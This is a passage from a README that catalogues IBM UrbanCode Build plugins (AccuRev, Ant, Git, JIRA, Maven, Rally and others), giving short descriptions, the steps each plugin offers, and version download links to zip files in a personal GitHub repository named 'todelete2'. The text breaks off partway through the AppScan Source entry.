
Welcome to UrbanCode Build Plugins
==================================

Contents
========

* [List of all Plugins](#list-of-all-plugins)
	* [AccuRev](#accurev)
	* [AccuWork](#accuwork)
	* [Ant](#ant)
	* [Artifactory for IBM UrbanCode Build](#artifactory-for-ibm-urbancode-build)
	* [ClearCase Base Snapshot](#clearcase-base-snapshot)
	* [ClearCase UCM](#clearcase-ucm)
	* [ClearQuest](#clearquest)
	* [Clover](#clover)
	* [Cobertura](#cobertura)
	* [CodeStation](#codestation)
	* [CppUnit](#cppunit)
	* [Cucumber](#cucumber)
	* [Docker Build](#docker-build)
	* [File System for IBM UrbanCode Build](#file-system-for-ibm-urbancode-build)
	* [File Utils for IBM UrbanCode Build](#file-utils-for-ibm-urbancode-build)
	* [FindBugs](#findbugs)
	* [Gerrit](#gerrit)
	* [Git for IBM UrbanCode Build](#git-for-ibm-urbancode-build)
	* [Groovy for IBM UrbanCode Build](#groovy-for-ibm-urbancode-build)
	* [HP Fortify](#hp-fortify)
	* [HP Quality Center](#hp-quality-center)
	* [CA Harvest SCM](#ca-harvest-scm)
	* [JIRA for IBM UrbanCode Build](#jira-for-ibm-urbancode-build)
	* [JUnit for IBM UrbanCode Build](#junit-for-ibm-urbancode-build)
	* [JaCoCo](#jacoco)
	* [MSBuild](#msbuild)
	* [MSTest](#mstest)
	* [Make](#make)
	* [Maven for IBM UrbanCode Build](#maven-for-ibm-urbancode-build)
	* [Mercurial](#mercurial)
	* [Mocha](#mocha)
	* [NAnt](#nant)
	* [NCover](#ncover)
	* [NPM for IBM UrbanCode Build](#npm-for-ibm-urbancode-build)
	* [NUnit](#nunit)
	* [PMD](#pmd)
	* [Perforce](#perforce)
	* [Preflight](#preflight)
	* [QTP](#qtp)
	* [Rational Team Concert Work Items](#rational-team-concert-work-items)
	* [Rake](#rake)
	* [Rally for IBM UrbanCode Build](#rally-for-ibm-urbancode-build)
	* [IBM Security AppScan Source](#ibm-security-appscan-source)
	* [Rational Team Concert SCM](#rational-team-concert-scm)
	* [Report Publisher](#report-publisher)
	* [Reporting](#reporting)
	* [Selenium for IBM UrbanCode Build](#selenium-for-ibm-urbancode-build)
	* [Shell for IBM UrbanCode Build](#shell-for-ibm-urbancode-build)
	* [SonarQube (formerly Sonar)](#sonarqube-formerly-sonar)
	* [SonarQube](#sonarqube)
	* [Sonargraph](#sonargraph)
	* [Subversion for IBM UrbanCode Build](#subversion-for-ibm-urbancode-build)
	* [Team Foundation Server](#team-foundation-server)
	* [TFS Work Items](#tfs-work-items)
	* [UrbanCode Velocity](#urbancode-velocity)
	* [UCB Utilities](#ucb-utilities)
	* [Visual Studio](#visual-studio)
	* [Xcode](#xcode)
	* [DevOps Insights – Deployment Risk Analytics (DRA)](#devops-insights--deployment-risk-analytics-dra)
	* [Checkstyle](#checkstyle)
	* [digital-experience](#digital-experience)
	* [dimensions](#dimensions)
	* [IBM Dependency Based Build](#ibm-dependency-based-build)
	* [IBM UrbanCode Deploy for IBM UrbanCode Build](#ibm-urbancode-deploy-for-ibm-urbancode-build)
	* [jac](#jac)
	* [plugins-ucb-velocity](#plugins-ucb-velocity)
	* [Salesforce](#salesforce)
	* [uDeploy](#udeploy)

# List of all Plugins

## AccuRev



AccuRev is a tool that provides version control for source code. 


The AccuRev plug-in automates populating an AccuRev
 workspace, creating a tag, and publishing source changes to the Changes tab of the buildlife.




|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**6.752929**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/AccuRev/AccuRev-6.752929.zip)|[Overview](plugins/AccuRev/overview.md)|[Settings](plugins/AccuRev/settings.md)|[Downloads](plugins/AccuRev/downloads.md)|


---
## AccuWork



The integration with AccuWork to report on issues and add comments to them.



Available Steps
---------------


Add 
CommentsAdd comments to existing issues


Change StatusChange the status of existing issues


Get DetailsRetrieve 
information on AccuWork issues using source changes detected in AccuRev





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**8.1096129**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/AccuWork/AccuWork-8.1096129.zip)|[Overview](plugins/AccuWork/overview.md)|[Steps](plugins/AccuWork/steps.md)|[Downloads](plugins/AccuWork/downloads.md)|


---
## Ant



Apache Ant is a software tool that automates software processes during the building or deployment of an application. 
Ant uses an proprietary XML file to define build and deployment steps, which are referred to as targets in Ant. Ant is 
called to run the targets in the build.xml file.


The Ant plug-in is an automation-type plug-in. It runs during a build
 to automate Ant tasks that are defined in a build.xml file.



Available Steps
---------------


Ant Run an Ant script.






|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**8.913229**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Ant/Ant-8.913229.zip)|[Overview](plugins/Ant/overview.md)|[Steps](plugins/Ant/steps.md)|[Downloads](plugins/Ant/downloads.md)|


---
## Artifactory for IBM UrbanCode Build



The Artifactory automation plug-in includes steps to complete the following tasks:


* Download artifacts from an 
Artifactory repository
* Upload artifacts to an Artifactory repository
* Upload build information to Artifactory




|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**11.930715**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Artifactory/Artifactory-11.930715.zip)|[Overview](plugins/Artifactory/overview.md)|[Steps](plugins/Artifactory/steps.md)|[Downloads](plugins/Artifactory/downloads.md)|


---
## ClearCase Base Snapshot



IBM Rational ClearCase provides tools for supporting software configuration management (SCM) of source code and other 
software development assets.


The ClearCase Base Snapshot plug-in integrates IBM UrbanCode Build with IBM Rational 
ClearCase allowing source to be pulled from the SCM for builds. It also allows builds to be started from code commits to
 ClearCase.





|Latest Version||||||
| :---: | :---: | :---: | :---: | :---: | :---: |
|[**14.767774**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/ClearCaseBaseSnapshot/ClearCaseBaseSnapshot-14.767774.zip)|[Overview](plugins/ClearCaseBaseSnapshot/overview.md)|[Usage](plugins/ClearCaseBaseSnapshot/usage.md)|[Steps](plugins/ClearCaseBaseSnapshot/steps.md)|[Settings](plugins/ClearCaseBaseSnapshot/settings.md)|[Downloads](plugins/ClearCaseBaseSnapshot/downloads.md)|


---
## ClearCase UCM



IBM Rational ClearCase provides tools for supporting software configuration management (SCM) of source code and other 
software development assets.


The ClearCase UCM plug-in integrates IBM UrbanCode Build with Rational ClearCase allowing
 source to be pulled from the ClearCase repository for builds. It also allows builds to be started from code commits to 
Rational ClearCase.





|Latest Version|||||
| :---: | :---: | :---: | :---: | :---: |
|[**16.97304**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/ClearCaseUCM/ClearCaseUCM-16.973040.zip)|[Overview](plugins/ClearCaseUCM/overview.md)|[Steps](plugins/ClearCaseUCM/steps.md)|[Usage](plugins/ClearCaseUCM/usage.md)|[Downloads](plugins/ClearCaseUCM/downloads.md)|


---
## ClearQuest



ClearQuest provides change tracking, process automation, reporting and lifecycle traceability for better visibility and
 control of the software development lifecycle.



Available Steps
---------------


Add Comment Add Comments from the 
current changelog to matching ClearQuest Defects


Create Defect Create a new defect in a ClearQuest Defect Tracker



Publish Defect Report Create a Report of ClearQuest defects from the current changelog


Resolve Issue Resolve a 
ClearQuest Defect





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**5.752905**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/ClearQuest/ClearQuest-5.752905.zip)|[Overview](plugins/ClearQuest/overview.md)|[Steps](plugins/ClearQuest/steps.md)|[Downloads](plugins/ClearQuest/downloads.md)|


---
## Clover



Atlassian Clover is a code coverage tool that collects and generates a report about the code covered through automatic 
testing. 


The Clover plug-in uploads Clover test results.



Available Steps
---------------


Publish Clover 
ReportUpload a Clover report.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**2.752899**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Clover/clover-2.752899.zip)|[Overview](plugins/Clover/overview.md)|[Steps](plugins/Clover/steps.md)|[Downloads](plugins/Clover/downloads.md)|


---
## Cobertura



Cobertura is a Java tool that calculates the percentage of code accessed by tests. 


The Cobertura plug-in contains a 
step to upload Cobertura report results.



Available Steps
---------------


Publish Cobertura ReportUpload a Cobertura
 report.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**5.752901**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Cobertura/cobertura-5.752901.zip)|[Overview](plugins/Cobertura/overview.md)|[Steps](plugins/Cobertura/steps.md)|[Downloads](plugins/Cobertura/downloads.md)|


---
## CodeStation



The CodeStation plug-in provides steps to download artifacts from and upload artifacts to CodeStation.



Available 
Steps
---------------


Download Another Project Artifacts Download artifact set files from a different CodeStation 
project.


Download Artifacts Download artifact set files from CodeStation.


Download Dependencies Download 
dependencies from CodeStation.


Upload All Artifacts Upload all configured artifact sets to CodeStation.


Upload 
Artifacts Upload a specific artifact set to CodeStation.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**24.1069469**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/CodeStation/codestation-24.1069469.zip)|[Overview](plugins/CodeStation/overview.md)|[Steps](plugins/CodeStation/steps.md)|[Downloads](plugins/CodeStation/downloads.md)|


---
## CppUnit



CppUnit is a unit testing framework for the C++ programming language.



Available Steps
---------------


CppUnit 
ReportPublish CppUnit results as a Report





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**3.73689**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/CppUnit/CppUnit-3.736890.zip)|[Overview](plugins/CppUnit/overview.md)|[Steps](plugins/CppUnit/steps.md)|[Downloads](plugins/CppUnit/downloads.md)|


---
## Cucumber



Cucumber is a software testing tool that runs automated acceptance tests written in a behavior-driven development (BDD)
 style. BDD testing focuses on the behaviour of the product.


The Cucumber plug-in automates the running of Cucumber 
test scenarios.



Available Steps
---------------


Compile step definitionCompile the test definitions.


Run 
TestingRuns the Cucumber test definitions.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**1.922549**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Cucumber/Cucumber-1.922549.zip)|[Overview](plugins/Cucumber/overview.md)|[Steps](plugins/Cucumber/steps.md)|[Downloads](plugins/Cucumber/downloads.md)|


---
## Docker Build



Docker is an open platform for distributed applications for developers and sysadmins.


Leverage this plugin to build 
Docker images with UrbanCode Build



Available Steps
---------------


Docker BuildBuild a Docker image from a 
Dockerfile and set the image id as a build life property.


Docker PushPublish a Docker image to a registry.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**6.1036529**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Docker/docker-plugin-6.1036529.zip)|[Overview](plugins/Docker/overview.md)|[Steps](plugins/Docker/steps.md)|[Downloads](plugins/Docker/downloads.md)|


---
## File System for IBM UrbanCode Build



Instead of using a SCM system, the File System repository expects files to be present in the working directory.




Available Steps
---------------


FileSystem ChangelogGet the latest modified date for the working directory



FileSystem CheckoutDoes nothing.


FileSystem CleanupPerform a cleanup of the working directory


FileSystem Quiet 
PeriodGet the latest modified date for the working directory


FileSystem TagDoes nothing.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**5.913286**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/FileSystem/FileSystem-5.913286.zip)|[Overview](plugins/FileSystem/overview.md)|[Steps](plugins/FileSystem/steps.md)|[Downloads](plugins/FileSystem/downloads.md)|


---
## File Utils for IBM UrbanCode Build



The File Utils plug-in includes steps that automate folder and file tasks as part of a deployment process.


For 
example, this plug-in includes steps for deleting or creating directories and for replacing tokens in a file.




Available Steps
---------------


Copy DirectoryCopies the contents of one directory to one or more other directories 
overwriting files, but not deleting any.


Create DirectoriesCreate a set of directories including parent directories.



Create FileCreate a file.


Create .zip FileCreate a .zip file.


Delete Files and DirectoriesDelete a set of 
files/directories.


Flip Line EndingsA step that allows you to flip line endings for all files that match the includes.



Monitor File ContentsMonitors a file for a token and continue when token appears or fail if not found in allotted 
time. The step ignores content that was present before the start of the step.


Move DirectoryMoves files to a 
destination.


Read Properties From XML FileParse an XML file to search for properties defined by element names.


Read 
Property FileRead properties from a file and sets them as output properties for this step.


Replace TokensReplace 
tokens in files using properties.


Synchronize DirectoriesMoves new files in source to destination and deletes files in
 destination not in source. Synchronization is based on the file time stamp.


Untar TarballExtract .tar file.



UnzipExtract .zip file.


Update INI FileUpdate Windows style INI file. This step can handle sections of properties.



Update Java Properties FileAdd, remove, and update properties in a Java properties file.


Update XML File with 
XPathUpdate XML files using XPath to locate items to edit.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**44.754293**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/FileUtils/FileUtils-44.754293.zip)|[Overview](plugins/FileUtils/overview.md)|[Steps](plugins/FileUtils/steps.md)|[Downloads](plugins/FileUtils/downloads.md)|


---
## FindBugs



FindBugs is an open source development tool which uses static analysis to look for bugs in Java code.  

The FindBugs 
plugin uploads the FindBugs results generated during the build to the Analytics tab of the BuildLife.



Available Steps

---------------


Publish ResultsPublish FindBugs results to a build life. This reads the XML output of FindBugs.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**11.753113**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/FindBugs/FindBugs-11.753113.zip)|[Overview](plugins/FindBugs/overview.md)|[Steps](plugins/FindBugs/steps.md)|[Downloads](plugins/FindBugs/downloads.md)|


---
## Gerrit



Gerrit is a web based code review system, facilitating online code reviews for projects using the Git version control 
system.


Gerrit makes reviews easier by showing changes in a side-by-side display, and allowing inline comments to be 
added by any reviewer.


This plugin provides a step to apply a Gerrit code review.




|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**2.749192**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Gerrit/gerrit-2.749192.zip)|[Overview](plugins/Gerrit/overview.md)|[Steps](plugins/Gerrit/steps.md)|[Downloads](plugins/Gerrit/downloads.md)|


---
## Git for IBM UrbanCode Build



Git is a distributed revision control system. Git was initially designed and developed by Linus Torvalds for Linux 
kernel development.  

The Git plug-in automates cloning a Git repository, tagging source artifacts, and publishing 
source artifact changes to the Changes page of the build life.



Available Steps
---------------


Git Changelog 
Perform a Git changelog and publish the results.


Git Checkout Perform a Git checkout of the workflow’s source.


Git 
Cleanup Perform a cleanup of the Git working directory.


Git Create Tag Create a tag in Git of the specified working 
copy.


Git Quiet Period Perform a Git changelog for quiet period detection and publish most recent change date within 
the period.


Create GitHub Status Create a commit status in GitHub or GitHub Enterprise.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**29.1127031**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Git/Git-29.1127031.zip)|[Overview](plugins/Git/overview.md)|[Steps](plugins/Git/steps.md)|[Downloads](plugins/Git/downloads.md)|


---
## Groovy for IBM UrbanCode Build



Groovy is an object-oriented programming language for the Java platform. It is a dynamic language and can be used as a 
scripting language.


The Groovy plug-in is an automation-type plug-in that provides a step for running user-defined 
Groovy scripts.



Available Steps
---------------


Run Groovy Script Run a Groovy script.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**9.891045**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Groovy/Groovy-9.891045.zip)|[Overview](plugins/Groovy/overview.md)|[Steps](plugins/Groovy/steps.md)|[Downloads](plugins/Groovy/downloads.md)|


---
## HP Fortify



HP’s Fortify Source Code Analyzer provides static analysis of application source code to help identify possible 
security vulnerabilities.


The HP Fortify plugin will build and scan the project and upload the results to the HP 
Fortify server.



Available Steps
---------------


Fortify BuildRun a build using Fortify


Fortify CleanRun a clean 
with the Fortify SourceAnalyzer


Fortify ScanRun a scan using Fortify and upload the results to uBuild


Fortify 
UploadUpload the Fortify scan output to the HP Fortify and UrbanCode Build servers





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**4.752922**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/HPFortify/Fortify-4.752922.zip)|[Overview](plugins/HPFortify/overview.md)|[Steps](plugins/HPFortify/steps.md)|[Downloads](plugins/HPFortify/downloads.md)|


---
## HP Quality Center



HP Quality Center (QC) is a set of web-based test management software offerings from the HP Software Division of 
Hewlett-Packard, many of which were acquired from Mercury Interactive Corporation. HP Quality Center offers software 
quality assurance, including requirements management, test management and business process testing for IT and 
application environments. In order for this plugin to work with HP ALM 11 and later, you must open the web UI of HP ALM 
from the agent machine, click on their ‘Add-ins Page’ link and install the ‘HP ALM Connectivity’ add-in.


The HP 
Quality Center Plugin automates the creation and deletion of issues in QC. The plugin can also run test sets and publish
 the test reports.



Available Steps
---------------


Add CommentsAdd comments to a defect in HP Quality Center.



Create IssueCreate a new defect in HP Quality Center.


Publish Issue ReportCreate a report of Quality Center defects 
from the current changelog.


Publish Test Set ReportPublish a HP Quality Center Test Set Report.


Run Test SetRun a 
Test Set using HP Quality Center.


Update IssuesUpdate one or more defects in HP Quality Center.


Verify Issues Fieldn
 Verify that all of the Issues associated with the current Build Life have a given field values





|Latest Version|||||
| :---: | :---: | :---: | :---: | :---: |
|[**8.752924**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/HPQualityCenter/HPQualityCenter-8.752924.zip)|[Overview](plugins/HPQualityCenter/overview.md)|[Steps](plugins/HPQualityCenter/steps.md)|[Troubleshooting](plugins/HPQualityCenter/troubleshooting.md)|[Downloads](plugins/HPQualityCenter/downloads.md)|


---
## CA Harvest SCM



The CA Harvest SCM plug-in automates integration with a CA Harvest repository. Using the plug-in you can checkout and 
publish source changes to the Changes tab of the BuildLife. 


This UrbanCode Build plug-in works with all current 
supported versions of CA Harvest Software Change Manager (SCM).




|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**7.1098511**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Harvest/Harvest-hcl-7.1098511.zip)|[Overview](plugins/Harvest/overview.md)|[Steps](plugins/Harvest/steps.md)|[Downloads](plugins/Harvest/downloads.md)|


---
## JIRA for IBM UrbanCode Build



JIRA is an issue tracking product, developed by Atlassian. It is used for bug tracking, issue tracking and project 
management.


This plugin provides a integrations with JIRA. Issues can be reported on, commented on, updated and 
created. This integration requires that the SOAP Service be enabled in RPC JIRA Plugin in JIRA.



Available Steps

---------------


Add CommentsAdd comments to JIRA issues detected by parsing the source change comments of the build 
life.


Check StatusValidate the status of JIRA issues detected by parsing the source change comments of the build life.



Create IssueCreate a new issue in JIRA. The type of issue created is configurable.


Publish Issue ReportCreate a 
report of JIRA issues detected by parsing the source change comments of the build life.


Update IssueUpdate JIRA issues
 detected by parsing the source change comments of the build life.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**7.876389**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/JIRA/JIRA-7.876389.zip)|[Overview](plugins/JIRA/overview.md)|[Steps](plugins/JIRA/steps.md)|[Downloads](plugins/JIRA/downloads.md)|


---
## JUnit for IBM UrbanCode Build



JUnit is a unit testing framework for the Java programming language. The JUnit plug-in publishes results of a JUnit 
test into a report. 



Available Steps
---------------


JUnit ReportPublish JUnit results as a report.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**10.1071521**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/JUnit/JUnit-10.1071521.zip)|[Overview](plugins/JUnit/overview.md)|[Steps](plugins/JUnit/steps.md)|[Downloads](plugins/JUnit/downloads.md)|


---
## JaCoCo



Plugin to upload JaCoCo report results. This plugin version also now supports grouped reports.



Available Steps

---------------


Publish JaCoCo ReportPublish a JaCoCo report.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**7.950839**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Jacoco/JaCoCo-7.950839.zip)|[Overview](plugins/Jacoco/overview.md)|[Steps](plugins/Jacoco/steps.md)|[Downloads](plugins/Jacoco/downloads.md)|


---
## MSBuild



MSBuild is the build system for Visual Studio.


The MSBuild plugin allows running of MSBuild files.



Available Steps

---------------


Run MSBuildInvoke MSBuild





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**2.752736**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/MSBuild/MSBuild-2.752736.zip)|[Overview](plugins/MSBuild/overview.md)|[Steps](plugins/MSBuild/steps.md)|[Downloads](plugins/MSBuild/downloads.md)|


---
## MSTest



The MSTest.exe is used to run automated test from a command line. The MSTest plug-in uploads MSTest results generated 
during the build to the Test tab of the BuildLife.



Available Steps
---------------


MSTest Report PublisherPublish 
MSTest results as a report





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**7.752751**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/MSTest/MSTest-7.752751.zip)|[Overview](plugins/MSTest/overview.md)|[Steps](plugins/MSTest/steps.md)|[Downloads](plugins/MSTest/downloads.md)|


---
## Make



Plugin to allow running of Make files.



Available Steps
---------------


Run Make FileExecute a Make script





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**3.752874**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Make/Make-3.752874.zip)|[Overview](plugins/Make/overview.md)|[Steps](plugins/Make/steps.md)|[Downloads](plugins/Make/downloads.md)|


---
## Maven for IBM UrbanCode Build



Apache Maven is a software project management and comprehension tool. Based on the concept of a project object model 
(POM), Maven can manage building, reporting and documenting a project from a central piece of information.


The Maven 
plug-in includes a step that runs Maven builds.



Available Steps
---------------


Maven Build Run a Maven build





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**9.913233**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Maven/Maven-9.913233.zip)|[Overview](plugins/Maven/overview.md)|[Steps](plugins/Maven/steps.md)|[Downloads](plugins/Maven/downloads.md)|


---
## Mercurial



Mercurial is a cross-platform, distributed revision control tool for software developers.


The Mercurial plugin 
automates cleaning and populating a Mercurial workspace, creating a tag, and publishing source changes to the Changes 
tab of the BuildLife.



Available Steps
---------------


Mercurial ChangelogPerform a Mercurial changelog and publish 
the results.


Mercurial CheckoutPerform a Mercurial clone and checkout of the workflow’s source


Mercurial 
CleanupPerform a cleanup of the Mercurial working directory


Mercurial Create TagCreate a tag in Mercurial of the 
specified working copy.


Mercurial Quiet PeriodPerform a Mercurial changelog for quiet period detection and publish 
most recent change date within the period.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**6.753091**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Mercurial/Mercurial-6.753091.zip)|[Overview](plugins/Mercurial/overview.md)|[Steps](plugins/Mercurial/steps.md)|[Downloads](plugins/Mercurial/downloads.md)|


---
## Mocha



Mocha is a testing framework that allows you to organize and run testcases on JavaScript that runs in a Node.js. Mocha 
runs in a browser and provides a number of features such as: browser support, asynchronous testing, test coverage 
reports, and use of any assertion library. 


The Mocha plug-in executes Mocha tests and places the test results in a 
specified folder.



Available Steps
---------------


Run Test Run a Mocha test file.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**2.1007779**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Mocha/Mocha-2.1007779.zip)|[Overview](plugins/Mocha/overview.md)|[Steps](plugins/Mocha/steps.md)|[Downloads](plugins/Mocha/downloads.md)|


---
## NAnt



Plugin to allow running of NAnt files.



Available Steps
---------------


Run NAntExecute a NAnt script





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**3.752793**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/NAnt/Nant-3.752793.zip)|[Overview](plugins/NAnt/overview.md)|[Steps](plugins/NAnt/steps.md)|[Downloads](plugins/NAnt/downloads.md)|


---
## NCover



Plugin to upload NCover test results.



Available Steps
---------------


NCover Coverage ReportReport the results of 
a scan to IBM UrbanCode Build.


Run NCoverRun an NCover code coverage analysis on a .NET application.





|Latest Version||
| :---: | :---: |
|[**1.759854**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/NCover/NCover-1.759854.zip)|[Downloads](plugins/NCover/downloads.md)|


---
## NPM for IBM UrbanCode Build



NPM is the package manager for JavaScript. The NPM plugin provides command steps to perform the following operations:



* Initialize a package.json file
* Install packages
* Update packages
* Uninstall packages
* Publish a package to the
 registry
* Update and edit the contents of the user and global npmrc files




|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**1.1098517**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/NPM/NPM-1.1098517.zip)|[Overview](plugins/NPM/overview.md)|[Steps](plugins/NPM/steps.md)|[Downloads](plugins/NPM/downloads.md)|


---
## NUnit



NUnit is a unit-testing framework for all .Net languages.


Publish NUnit test results for reporting and trending.




Available Steps
---------------


NUnit ReportPublish NUnit test results for reporting and trending.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**4.752916**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/NUnit/NUnit-4.752916.zip)|[Overview](plugins/NUnit/overview.md)|[Steps](plugins/NUnit/steps.md)|[Downloads](plugins/NUnit/downloads.md)|


---
## PMD



PMD is an open source source code analyzer for Java source code. It scans source code looking for potential programming
 issues and produces a report of found problems. Some of the types of issues that are located are: unused variables, 
empty catch blocks, and unnecessary loops and IF statements.


The PMD plug-in uploads the results of the PMD analyzer 
generated during the build process and places them on the **Analytics** tab of the BuildLife.



Available Steps

---------------


Publish PMD ResultsPublish PMD results to a build life.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**5.752822**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/PMD/Pmd-5.752822.zip)|[Overview](plugins/PMD/overview.md)|[Steps](plugins/PMD/steps.md)|[Downloads](plugins/PMD/downloads.md)|


---
## Perforce



Perforce is a commercial, proprietary, centralized revision control system developed by Perforce Software, Inc.



Support for the Perforce source control management system.



Available Steps
---------------


Perforce 
ChangelogPerform a Perforce changelog. By default this will be between the previous buildlife and the current one.



Perforce CheckoutPerform a Perforce login, create client, getclientinfo, set workdir, sync as indicated by source 
configuration


Perforce CleanupPerform a cleanup of the current working directory


Perforce Label


Perforce Quiet 
PeriodPerform a Perforce changelog for quiet period detection and publish the results.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**16.752926**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Perforce/Perforce-16.752926.zip)|[Overview](plugins/Perforce/overview.md)|[Steps](plugins/Perforce/steps.md)|[Downloads](plugins/Perforce/downloads.md)|


---
## Preflight



The Preflight plug-in provides steps that can be used for developer preflight builds.



Available Steps

---------------


Transfer Artifacts Step


Transfer Source Step





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**4.752928**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Preflight/preflight-plugin-4.752928.zip)|[Overview](plugins/Preflight/overview.md)|[Steps](plugins/Preflight/steps.md)|[Downloads](plugins/Preflight/downloads.md)|


---
## QTP



HP QuickTest Professional provides functional and regression test automation for software applications and 
environments, and can be used for enterprise quality assurance.


The QTP plugin executes QTP tests.



Available Steps

---------------


Run QuickTest Pro testsRun QuickTest Pro tests





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**3.752827**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/QTP/QTP-3.752827.zip)|[Overview](plugins/QTP/overview.md)|[Steps](plugins/QTP/steps.md)|[Downloads](plugins/QTP/downloads.md)|


---
## Rational Team Concert Work Items



IBM Rational Team Concert integrates task tracking, source control, and agile planning with continuous builds and a 
configurable process to adapt to the way you work.


The RTC Work Items plugin provides steps for the build to comment, 
change status, and resolve work items found in RTC and publish a list of work items that were addressed in the build to 
the Issues tab for the BuildLife



Available Steps
---------------


Add CommentAdd Comments from the current changelog
 to matching RTC work items.


Change Work Item StatusUpdate the status of RTC work items. *Note* If updating multiple 
work items it is possible that some may be updated within a ‘Failed’ step if they occurred before the execption was 
thrown.


Publish Work Item ReportCreate a report of RTC work items from the build life’s changelog on the build life.






|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**10.866824**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/RTCWorkItems/RTC-WorkItems-10.866824.zip)|[Overview](plugins/RTCWorkItems/overview.md)|[Steps](plugins/RTCWorkItems/steps.md)|[Downloads](plugins/RTCWorkItems/downloads.md)|


---
## Rake



Rake is a utility that controls the generation of executables and other nonsource files of a Ruby program. The 
information for building the program is in a Rake script known as a Rakefile. 


The Rake plug-in automates builds that 
use Rakefile files.



Available Steps
---------------


Run Rake FileRun a Rakefile file.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**3.752923**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Rake/Rake-3.752923.zip)|[Overview](plugins/Rake/overview.md)|[Steps](plugins/Rake/steps.md)|[Downloads](plugins/Rake/downloads.md)|


---
## Rally for IBM UrbanCode Build



Rally is an agile project management tool that tracks project requirements, tests and defects.


The Rally plug-in 
contains steps to create and update Rally defects. It also provides steps to create a report of defects and build 
status.



Available Steps
---------------


Add CommentsAdd comments from the current changelog to matching Rally 
defects.


Change Rally Artifact Property Update a property on a Rally artifact.


Change Status Update the status of a 
Rally defect.


Create Defect Create a defect in the Rally repository.


Publish Defect Report Create a report of Rally 
defects based on the current changelog.


Report Build Status Report the build status.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**17.1126865**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Rally/ucd-Rally-17.1126865.zip)|[Overview](plugins/Rally/overview.md)|[Steps_and_Settings](plugins/Rally/steps_and_settings.md)|[Downloads](plugins/Rally/downloads.md)|


---
## IBM Security AppScan Source



IBM® Security AppScan® Source helps organizations lower costs and reduce risk exposure by identifying web-based and 
